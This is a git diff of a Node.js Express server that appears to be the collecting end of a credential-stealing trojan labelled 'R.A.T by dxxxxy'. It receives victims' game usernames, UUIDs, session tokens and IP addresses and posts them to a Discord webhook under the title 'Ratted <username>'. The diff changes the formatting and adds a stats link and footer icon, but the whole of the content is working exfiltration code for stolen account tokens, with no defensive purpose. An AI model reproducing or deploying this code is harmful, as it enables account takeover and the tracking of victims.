@@ -63,13 +63,15 @@ app.post("/", (req, res) => {
             if (usingDiscord) {
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
-                    content: "@everyone", //ping whoever u want
+                    content: "@everyone", //ping
                     embeds: [{
-                        title: `Ratted ${req.body.username}`,
-                        description: `Username: \`${req.body.username}\`\nUUID: \`${req.body.uuid}\`\nToken: \`${req.body.token}\`\nIP: \`${req.body.ip}\`\nTokenAuth: \`${req.body.username}:${req.body.uuid}:${req.body.token}\``,
+                        title: `Ratted ${req.body.username} - Click For Stats`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\``,
+                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
-                            text: "R.A.T by dxxxxy"
+                            "text": "R.A.T by dxxxxy",
+                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
                         },
                         timestamp: new Date()
                     }],
